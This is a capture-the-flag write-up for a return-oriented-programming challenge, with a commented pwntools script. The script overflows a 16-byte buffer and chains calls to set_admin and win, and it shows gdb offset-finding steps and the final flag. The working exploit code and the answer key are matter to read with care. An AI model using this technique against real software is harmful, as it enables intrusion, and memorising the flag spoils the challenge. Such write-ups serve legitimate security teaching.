# ROP 1

Author: Mukund

You won't be able to get the flag this time. Therer's no way you can chain multiple functions with a buffer overflow, right?

## Solution

```python
from pwn import *

context.log_level = "debug"
io = remote("ctf.cybr.club", 443, ssl=True, sni="rop-1")
#io = process("rop_1") # For running locally


# Must set `admin` to 1 before calling `win` to get the flag
# Can be done by running `set_admin`, then calling `win` to print the flag

# Run `checksec` on the binary to see protections:
# https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec
#   $ checksec rop_1
#   [*] '/tmp/rop_1'
#       Arch:     amd64-64-little
#       RELRO:    Full RELRO
#       Stack:    No canary found
#       NX:       NX enabled
#       PIE:      No PIE (0x400000)
# There's no canary, so the stack can be overwritten without issue

# Get addresses of the `set_admin` and `win` functions
# https://docs.pwntools.com/en/stable/elf/elf.html
elf = ELF("rop-1")
set_admin = elf.symbols["set_admin"]
win = elf.symbols["win"]

# The `message` buffer is only 16 bytes, but up to 64 bytes can be input.
# Will need to fill enough bytes in the stack to overwrite RIP, which is the
# address that execution goes to whenever the `ret` instruction is called at
# the end of a function.

# Finding the number of bytes to fill the buffer with. Need to fill without
# overwriting the return address

# Created a pattern using `cyclic`:
# https://docs.pwntools.com/en/stable/commandline.html#pwn-cyclic
#   $ cyclic 63
#   aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa
# Then used gdb with that pattern as input to find where the program segfaults
# and take the address from the stack (using register RSP) to get the offset:
# https://visualgdb.com/gdbreference/commands/run
# https://visualgdb.com/gdbreference/commands/x
#   $ gdb ./rop_1
#   (gdb) r
#   Enter a message:
#   aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa
#   Your message: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa
#   Exiting...
#
#   Program received signal SIGSEGV, Segmentation fault.
#   0x00000000004012dc in main ()
#   (gdb) x/s $rsp
#   0x7fffffffe458:	"gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa"
# Then found the offset in the pattern using `cyclic`:
#   $ cyclic -l gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa
#   24

# Use bytes (b"") instead of a string ("") to avoid encoding issues and allow
# concatenating the addresses.
buf = b"A" * 24

# Overwrite return address with the addresses of the functions to call by
# appending to the payload buffer

# Pack addresses into 64 bits since it's a 64 bit executable (amd64-64-little)
# https://docs.pwntools.com/en/stable/elf/elf.html#pwnlib.elf.elf.ELF.p64
buf += p64(set_admin)
buf += p64(win)

# Send the payload and get any response
io.sendline(buf)
io.interactive(prompt="")
```

flag:
`gigem{rop_to_become_admin}`
